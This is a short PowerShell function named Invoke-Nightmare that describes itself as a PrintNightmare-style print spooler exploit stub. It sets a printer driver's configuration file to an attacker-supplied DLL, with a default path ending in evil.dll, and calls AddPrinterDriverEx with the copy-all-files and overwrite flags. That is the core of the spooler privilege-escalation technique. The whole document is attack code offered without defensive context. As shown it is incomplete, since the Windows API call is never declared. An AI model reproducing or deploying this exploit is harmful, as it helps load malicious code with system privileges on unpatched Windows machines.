function Invoke-Nightmare {
<#
.SYNOPSIS
Minimal PrintNightmare-shaped spooler exploit stub: replaces the printer
driver configuration file with a supplied DLL and copies it with the
overwrite flags.
#>
    Param(
        [String]$DriverPath = "C:\Windows\system32\evil.dll"
    )
    $DLL = $DriverPath
    $driver = New-Object PSObject
    $driver | Add-Member NoteProperty -Name pConfigFile -Value $null
    $driver.pConfigFile = $DLL
    AddPrinterDriverEx($driver, APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000)
}
